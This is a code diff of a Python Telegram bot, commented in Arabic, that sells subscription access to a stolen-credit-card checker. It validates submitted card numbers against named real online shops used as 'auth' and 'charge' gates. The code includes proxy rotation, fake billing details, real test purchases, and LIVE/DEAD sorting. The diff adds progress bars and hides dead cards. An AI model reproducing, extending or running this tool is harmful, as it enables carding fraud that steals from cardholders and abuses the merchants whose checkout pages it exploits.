@@ -33,11 +33,8 @@ except Exception as e:
     print(f"❌ خطأ في التوكن: {e}")
     sys.exit(1)
 
-# ================= قاعدة البيانات (مع دعم Railway) =================
-# ✅ استخدام متغير بيئة للمسار (يدعم Railway Volume)
+# ================= قاعدة البيانات =================
 DB_PATH = os.environ.get('DB_PATH', '/app/data/bot_database.db')
-
-# إنشاء مجلد البيانات تلقائياً إذا لم يكن موجوداً
 DB_DIR = os.path.dirname(DB_PATH)
 if not os.path.exists(DB_DIR):
     os.makedirs(DB_DIR)
@@ -304,26 +301,23 @@ def add_proxies_to_pool(proxy_list):
     return working
 
 # ================= البوابات =================
-# بوابات Auth (3 بوابات)
 AUTH_GATES = {
-    '1': {'name': '🏦 كوبنهاجن سيلفر', 'site': 'https://copenhagensilver.com'},
-    '2': {'name': '💳 سبوكان شيرت', 'site': 'https://www.spokaneshirtco.com'},
-    '3': {'name': '🔥 فور أول بروموز', 'site': 'https://www.4allpromos.com'}
+    '1': {'name': '🛡️ Auth 1', 'site': 'https://copenhagensilver.com'},
+    '2': {'name': '🛡️ Auth 2', 'site': 'https://www.spokaneshirtco.com'},
+    '3': {'name': '🛡️ Auth 3', 'site': 'https://www.4allpromos.com'}
 }
 
-# بوابة Charge (1 بوابة)
 CHARGE_GATE = {
     'site': 'https://www.hornbakersrepairandwelding.com',
-    'name': '🛒 Hornbakers Charge',
+    'name': '💰 Charge',
     'product_id': '6887',
     'product_url': '/shop/tools-2/tools-other-tools-2/tie-cable-nylon-4-black/'
 }
 
-# تخزين اختيارات المستخدم
 user_gate_choice = {}
 user_check_type = {}
+user_progress = {}  # لتتبع التقدم
 
-# ================= بيانات الفاتورة للـ Charge =================
 BILLING_INFO = {
     'first_name': 'Oscar',
     'last_name': 'Graves',
@@ -337,7 +331,6 @@ BILLING_INFO = {
     'email': lambda: f"{random.randint(100000,999999)}@temp.com"
 }
 
-# ================= BIN Lookup =================
 def get_bin_info(bin6):
     try:
         r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
@@ -354,7 +347,7 @@ def get_bin_info(bin6):
         pass
     return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🌍"}
 
-# ================= فحص Auth (على بوابة واحدة) =================
+# ================= فحص Auth =================
 def check_card_auth_single(card_str, site_url, proxy=None):
     parts = card_str.split('|')
     if len(parts) != 4:
@@ -439,7 +432,6 @@ def check_card_auth_with_retry(card_str, site_url):
                 time.sleep(proxy_pool.backoff_factor * (2 ** attempt))
     return "DECLINED"
 
-# ================= فحص Auth متعدد البوابات =================
 def check_card_multi_auth(card_str):
     results = []
     gates_order = ['1', '2', '3']
@@ -615,8 +607,38 @@ def check_card_charge_with_retry(card_str):
     return "DECLINED", None
 
 # ================= معالجة البطاقات =================
-def process_single_card_auth(card, idx, total, chat_id):
+def update_progress_message(chat_id, message_id, current, total, check_type):
+    """تحديث رسالة التقدم"""
+    try:
+        progress = int((current / total) * 100)
+        bar_length = 20
+        filled = int(bar_length * current / total)
+        bar = '█' * filled + '░' * (bar_length - filled)
+        
+        check_name = "Auth" if check_type == 'auth' else "Charge"
+        
+        progress_text = f"""⏳ **جاري الفحص...**
+
+📊 **التقدم:** {current}/{total} ({progress}%)
+{bar}
+
+⚡ **النوع:** {check_name}
+🔄 **الحالة:** يعمل الآن..."""
+        
+        bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
+    except:
+        pass
+
+def process_single_card_auth(card, idx, total, chat_id, progress_msg_id):
     final_status, emoji, results = check_card_multi_auth(card)
+    
+    # تحديث رسالة التقدم
+    update_progress_message(chat_id, progress_msg_id, idx, total, 'auth')
+    
+    # إذا كانت البطاقة ميتة، لا ترسلها
+    if final_status == "💀 DEAD":
+        return final_status
+    
     bin6 = card.split('|')[0][:6]
     bin_info = get_bin_info(bin6)
     
@@ -639,14 +661,21 @@ def process_single_card_auth(card, idx, total, chat_id):
 **Country:** {bin_info['country']} {bin_info['flag']}
 ╔════════════════════╗
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
-╚════════════════════╝
-**Progress:** {idx}/{total}"""
+╚════════════════════╝"""
     
     bot.send_message(chat_id, msg, parse_mode="Markdown")
     return final_status
 
-def process_single_card_charge(card, idx, total, chat_id):
+def process_single_card_charge(card, idx, total, chat_id, progress_msg_id):
     status, redirect = check_card_charge_with_retry(card)
+    
+    # تحديث رسالة التقدم
+    update_progress_message(chat_id, progress_msg_id, idx, total, 'charge')
+    
+    # إذا كانت البطاقة ميتة، لا ترسلها
+    if status == "DECLINED":
+        return status
+    
     bin6 = card.split('|')[0][:6]
     bin_info = get_bin_info(bin6)
     
@@ -668,8 +697,7 @@ def process_single_card_charge(card, idx, total, chat_id):
 **Country:** {bin_info['country']} {bin_info['flag']}
 ╔════════════════════╗
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
-╚════════════════════╝
-**Progress:** {idx}/{total}"""
+╚════════════════════╝"""
     
     bot.send_message(chat_id, msg, parse_mode="Markdown")
     return status
@@ -681,17 +709,27 @@ def check_cards(cards_text, chat_id, message_id, check_type):
         return
     
     total = len(cards)
-    check_name = "Multi-Auth (3 Gates)" if check_type == 'auth' else "Charge (1 Gate)"
-    bot.edit_message_text(f"🚀 بدء فحص {total} بطاقة | {check_name}...", chat_id, message_id)
+    
+    # إرسال رسالة التقدم الأولى
+    check_name = "Auth" if check_type == 'auth' else "Charge"
+    progress_text = f"""⏳ **جاري الفحص...**
+
+📊 **التقدم:** 0/{total} (0%)
+{'░' * 20}
+
+⚡ **النوع:** {check_name}
+🔄 **الحالة:** يعمل الآن..."""
+    
+    bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
     
     passed = otp = declined = charged = 0
     
     with ThreadPoolExecutor(max_workers=5) as executor:
         if check_type == 'auth':
-            futures = {executor.submit(process_single_card_auth, card, idx, total, chat_id): card 
+            futures = {executor.submit(process_single_card_auth, card, idx, total, chat_id, message_id): card 
                       for idx, card in enumerate(cards, 1)}
         else:
-            futures = {executor.submit(process_single_card_charge, card, idx, total, chat_id): card 
+            futures = {executor.submit(process_single_card_charge, card, idx, total, chat_id, message_id): card 
                       for idx, card in enumerate(cards, 1)}
         
         for future in as_completed(futures):
@@ -714,8 +752,10 @@ def check_cards(cards_text, chat_id, message_id, check_type):
             except:
                 declined += 1
     
+    # الملخص النهائي
     if check_type == 'auth':
-        summary = f"""🏁 **ملخص فحص Multi-Auth**
+        summary = f"""🏁 **انتهى الفحص**
+
 ✅ LIVE/SUPER: {passed}
 ⚠️ 3D SECURE: {otp}
 ❌ DECLINED: {declined}
@@ -723,7 +763,8 @@ def check_cards(cards_text, chat_id, message_id, check_type):
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
 ╚════════════════════╝"""
     else:
-        summary = f"""🏁 **ملخص فحص Charge**
+        summary = f"""🏁 **انتهى الفحص**
+
 💰 CHARGED: {charged}
 ⚠️ OTP: {otp}
 ❌ DECLINED: {declined}
@@ -732,162 +773,6 @@ def check_cards(cards_text, chat_id, message_id, check_type):
 ╚════════════════════╝"""
     
     bot.send_message(chat_id, summary, parse_mode="Markdown")
-
-# ================= أوامر البوت =================
-@bot.message_handler(commands=['start'])
-def start(message):
-    user_id = message.from_user.id
-    if user_id == ADMIN_ID:
-        bot.reply_to(message, "👋 مرحباً أدمن!\n\n"
-                    "📌 الأوامر:\n"
-                    "/admin - لوحة التحكم\n"
-                    "/check - اختيار نوع الفحص\n"
-                    "/status - حالة البروكسيات")
-    else:
-        if is_subscription_active(user_id):
-            bot.reply_to(message, "👋 مرحباً! اشتراكك نشط.\n\n"
-                        "📌 الأوامر:\n"
-                        "/check - اختيار نوع الفحص\n"
-                        "/redeem - تفعيل كود")
-        else:
-            bot.reply_to(message, "⛔ ليس لديك اشتراك.\nاستخدم `/redeem <الكود>`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['redeem'])
-def redeem(message):
-    user_id = message.from_user.id
-    if user_id == ADMIN_ID:
-        bot.reply_to(message, "أنت الأدمن، لا تحتاج لتفعيل اشتراك.")
-        return
-    parts = message.text.split()
-    if len(parts) != 2:
-        bot.reply_to(message, "❌ الاستخدام: `/redeem <الكود>`", parse_mode="Markdown")
-        return
-    code = parts[1].strip()
-    success, msg = redeem_code(user_id, code)
-    bot.reply_to(message, msg)
-
-@bot.message_handler(commands=['check'])
-def check_command(message):
-    user_id = message.from_user.id
-    if not is_subscription_active(user_id):
-        bot.reply_to(message, "⛔ اشتراكك غير نشط. استخدم /redeem")
-        return
-    
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("🛡️ فحص Auth (3 بوابات - مجاني)", callback_data="check_auth"),
-        types.InlineKeyboardButton("💰 فحص Charge (1 بوابة - خصم فعلي)", callback_data="check_charge")
-    )
-    bot.send_message(user_id, "🎯 اختر نوع الفحص:", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('check_'))
-def select_check_type(call):
-    user_id = call.from_user.id
-    if not is_subscription_active(user_id):
-        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
-        return
-    
-    check_type = call.data.split('_')[1]
-    user_check_type[user_id] = check_type
-    
-    if check_type == 'auth':
-        msg = "✅ تم اختيار **فحص Auth متعدد البوابات**\n\n"
-        msg += "📊 النظام:\n"
-        msg += "• 3 بوابات WooCommerce + Stripe\n"
-        msg += "• فحص متتابع (إذا فشلت تتوقف)\n"
-        msg += "• التصنيف: SUPER LIVE / LIVE / MAYBE LIVE / DEAD\n\n"
-        msg += "🎯 الآن اختر البوابة المفضلة (اختياري):"
-        
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(
-            types.InlineKeyboardButton("⚡ فحص سريع (3 بوابات تلقائي)", callback_data="gate_auto"),
-            types.InlineKeyboardButton(AUTH_GATES['1']['name'], callback_data="gate_1"),
-            types.InlineKeyboardButton(AUTH_GATES['2']['name'], callback_data="gate_2"),
-            types.InlineKeyboardButton(AUTH_GATES['3']['name'], callback_data="gate_3")
-        )
-        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
-    else:
-        msg = "✅ تم اختيار **فحص Charge**\n\n"
-        msg += f"🛒 البوابة: {CHARGE_GATE['name']}\n"
-        msg += f"💵 سيتم خصم مبلغ فعلي من البطاقة\n"
-        msg += f"📦 المنتج: {CHARGE_GATE['product_url']}\n\n"
-        msg += "⚠️ **تحذير:** هذا فحص حقيقي يخصم أموال!\n\n"
-        msg += "أرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
-        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_'))
-def select_gate(call):
-    user_id = call.from_user.id
-    if not is_subscription_active(user_id):
-        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
-        return
-    
-    gate_id = call.data.split('_')[1]
-    if gate_id == 'auto':
-        user_gate_choice[user_id] = 'auto'
-        msg = "✅ تم اختيار **الفحص التلقائي على 3 بوابات**\n\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
-    else:
-        user_gate_choice[user_id] = gate_id
-        msg = f"✅ تم اختيار {AUTH_GATES[gate_id]['name']}\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
-    
-    bot.edit_message_text(msg, call.message.chat.id, call.message.message_id)
-
-@bot.message_handler(commands=['status'])
-def status(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    active, banned, dead = proxy_pool.get_stats()
-    bot.reply_to(message, f"📊 **حالة البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")
-
-@bot.message_handler(content_types=['document'])
-def handle_docs(message):
-    user_id = message.from_user.id
-    if not is_subscription_active(user_id):
-        bot.reply_to(message, "⛔ اشتراكك غير نشط")
-        return
-    
-    file_info = bot.get_file(message.document.file_id)
-    content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-    filename = message.document.file_name.lower()
-    
-    if "proxy" in filename:
-        proxies = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
-        if proxies:
-            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
-            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
-        else:
-            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
-    else:
-        check_type = user_check_type.get(user_id, 'auth')
-        sent_msg = bot.reply_to(message, f"🚀 جاري الفحص...")
-        threading.Thread(target=check_cards, args=(content, message.chat.id, sent_msg.message_id, check_type)).start()
-
-@bot.message_handler(func=lambda m: True)
-def handle_text(message):
-    user_id = message.from_user.id
-    if not is_subscription_active(user_id):
-        bot.reply_to(message, "⛔ اشتراكك غير نشط")
-        return
-    
-    text = message.text.strip()
-    
-    if ":" in text and "|" not in text and not text.startswith('/'):
-        proxies = [p.strip() for p in text.splitlines() if p.strip() and ':' in p]
-        if proxies:
-            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
-            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
-        else:
-            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
-    elif "|" in text:
-        check_type = user_check_type.get(user_id)
-        if not check_type:
-            bot.reply_to(message, "❌ لم تختر نوع الفحص بعد. استخدم /check")
-            return
-        
-        sent_msg = bot.reply_to(message, f"🚀 جاري الفحص...")
-        threading.Thread(target=check_cards, args=(text, message.chat.id, sent_msg.message_id, check_type)).start()
-    else:
-        bot.reply_to(message, "❌ أرسل بطاقات (رقم|شهر|سنة|cvv) أو بروكسيات (ip:port)")
 
 # ================= لوحة الإدارة =================
 admin_session = {}
@@ -1022,6 +907,189 @@ def revoke_code_input(message):
         bot.send_message(user_id, f"❌ فشل إلغاء الكود.")
     admin_session[user_id] = 'authenticated'
     show_admin_menu(user_id)
+
+# ================= أوامر البوت (مخفية - للأدمن فقط) =================
+@bot.message_handler(commands=['start'])
+def start(message):
+    user_id = message.from_user.id
+    
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    
+    if user_id == ADMIN_ID:
+        markup.add(
+            types.InlineKeyboardButton("🛡️ فحص Auth", callback_data="check_auth"),
+            types.InlineKeyboardButton("💰 فحص Charge", callback_data="check_charge"),
+            types.InlineKeyboardButton("🔐 لوحة الإدارة", callback_data="admin_panel")
+        )
+        bot.reply_to(message, "👋 مرحباً أدمن!\n\nاختر نوع الفحص:", reply_markup=markup)
+    else:
+        if is_subscription_active(user_id):
+            markup.add(
+                types.InlineKeyboardButton("🛡️ فحص Auth", callback_data="check_auth"),
+                types.InlineKeyboardButton("💰 فحص Charge", callback_data="check_charge")
+            )
+            bot.reply_to(message, "👋 اشتراكك نشط!\n\nاختر نوع الفحص:", reply_markup=markup)
+        else:
+            markup.add(
+                types.InlineKeyboardButton("🎫 تفعيل اشتراك", callback_data="redeem_code")
+            )
+            bot.reply_to(message, "⛔ ليس لديك اشتراك.\n\nاضغط الزر لتفعيل اشتراكك:", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == 'admin_panel')
+def admin_panel_callback(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "غير مصرح لك.")
+        return
+    bot.answer_callback_query(call.id)
+    bot.send_message(call.from_user.id, "🔐 أدخل كلمة المرور:")
+    admin_session[call.from_user.id] = 'awaiting_password'
+
+@bot.callback_query_handler(func=lambda call: call.data == 'redeem_code')
+def redeem_code_callback(call):
+    user_id = call.from_user.id
+    if is_subscription_active(user_id):
+        bot.answer_callback_query(call.id, "اشتراكك نشط بالفعل!")
+        return
+    bot.answer_callback_query(call.id)
+    bot.send_message(user_id, "🎫 أرسل كود التفعيل:")
+    admin_session[user_id] = 'awaiting_user_redeem'
+
+@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_user_redeem')
+def user_redeem_code(message):
+    user_id = message.from_user.id
+    code = message.text.strip()
+    success, msg = redeem_code(user_id, code)
+    bot.reply_to(message, msg)
+    admin_session.pop(user_id, None)
+
+# ================= أوامر مخفية للأدمن =================
+@bot.message_handler(commands=['status'])
+def status(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    active, banned, dead = proxy_pool.get_stats()
+    bot.reply_to(message, f"📊 **حالة البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")
+
+@bot.message_handler(commands=['redeem'])
+def redeem(message):
+    user_id = message.from_user.id
+    if user_id == ADMIN_ID:
+        bot.reply_to(message, "أنت الأدمن، لا تحتاج لتفعيل اشتراك.")
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "❌ الاستخدام: `/redeem <الكود>`", parse_mode="Markdown")
+        return
+    code = parts[1].strip()
+    success, msg = redeem_code(user_id, code)
+    bot.reply_to(message, msg)
+
+# ================= Callback Handlers =================
+@bot.callback_query_handler(func=lambda call: call.data.startswith('check_'))
+def select_check_type(call):
+    user_id = call.from_user.id
+    if not is_subscription_active(user_id):
+        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
+        return
+    
+    check_type = call.data.split('_')[1]
+    user_check_type[user_id] = check_type
+    
+    if check_type == 'auth':
+        msg = "✅ تم اختيار **فحص Auth**\n\n"
+        msg += "📊 النظام:\n"
+        msg += "• 3 بوابات\n"
+        msg += "• فحص متتابع\n"
+        msg += "• التصنيف: SUPER LIVE / LIVE / MAYBE LIVE / DEAD\n\n"
+        msg += "🎯 اختر البوابة:"
+        
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("⚡ فحص سريع (3 بوابات تلقائي)", callback_data="gate_auto"),
+            types.InlineKeyboardButton(AUTH_GATES['1']['name'], callback_data="gate_1"),
+            types.InlineKeyboardButton(AUTH_GATES['2']['name'], callback_data="gate_2"),
+            types.InlineKeyboardButton(AUTH_GATES['3']['name'], callback_data="gate_3")
+        )
+        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+    else:
+        msg = "✅ تم اختيار **فحص Charge**\n\n"
+        msg += f"🛒 البوابة: {CHARGE_GATE['name']}\n\n"
+        msg += "أرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
+        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_'))
+def select_gate(call):
+    user_id = call.from_user.id
+    if not is_subscription_active(user_id):
+        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
+        return
+    
+    gate_id = call.data.split('_')[1]
+    if gate_id == 'auto':
+        user_gate_choice[user_id] = 'auto'
+        msg = "✅ تم اختيار **الفحص التلقائي على 3 بوابات**\n\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
+    else:
+        user_gate_choice[user_id] = gate_id
+        msg = f"✅ تم اختيار {AUTH_GATES[gate_id]['name']}\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
+    
+    bot.edit_message_text(msg, call.message.chat.id, call.message.message_id)
+
+# ================= Document Handler =================
+@bot.message_handler(content_types=['document'])
+def handle_docs(message):
+    user_id = message.from_user.id
+    if not is_subscription_active(user_id):
+        bot.reply_to(message, "⛔ اشتراكك غير نشط")
+        return
+    
+    file_info = bot.get_file(message.document.file_id)
+    content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
+    filename = message.document.file_name.lower()
+    
+    if "proxy" in filename:
+        proxies = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
+        if proxies:
+            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
+            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
+        else:
+            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
+    else:
+        check_type = user_check_type.get(user_id, 'auth')
+        sent_msg = bot.reply_to(message, f"⏳ جاري الفحص...")
+        threading.Thread(target=check_cards, args=(content, message.chat.id, sent_msg.message_id, check_type)).start()
+
+# ================= الـ Handler العام =================
+@bot.message_handler(func=lambda m: True)
+def handle_text(message):
+    user_id = message.from_user.id
+    if not is_subscription_active(user_id):
+        bot.reply_to(message, "⛔ اشتراكك غير نشط")
+        return
+    
+    text = message.text.strip()
+    
+    if ":" in text and "|" not in text and not text.startswith('/'):
+        proxies = [p.strip() for p in text.splitlines() if p.strip() and ':' in p]
+        if proxies:
+            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
+            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
+        else:
+            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
+    elif "|" in text:
+        check_type = user_check_type.get(user_id)
+        if not check_type:
+            markup = types.InlineKeyboardMarkup(row_width=1)
+            markup.add(
+                types.InlineKeyboardButton("🛡️ فحص Auth", callback_data="check_auth"),
+                types.InlineKeyboardButton("💰 فحص Charge", callback_data="check_charge")
+            )
+            bot.reply_to(message, "❌ لم تختر نوع الفحص بعد.\n\nاختر نوع الفحص:", reply_markup=markup)
+            return
+        
+        sent_msg = bot.reply_to(message, f"⏳ جاري الفحص...")
+        threading.Thread(target=check_cards, args=(text, message.chat.id, sent_msg.message_id, check_type)).start()
+    else:
+        bot.reply_to(message, "❌ أرسل بطاقات (رقم|شهر|سنة|cvv) أو بروكسيات (ip:port)")
 
 # ================= تشغيل البوت =================
 print("✅ البوت شغال مع:")
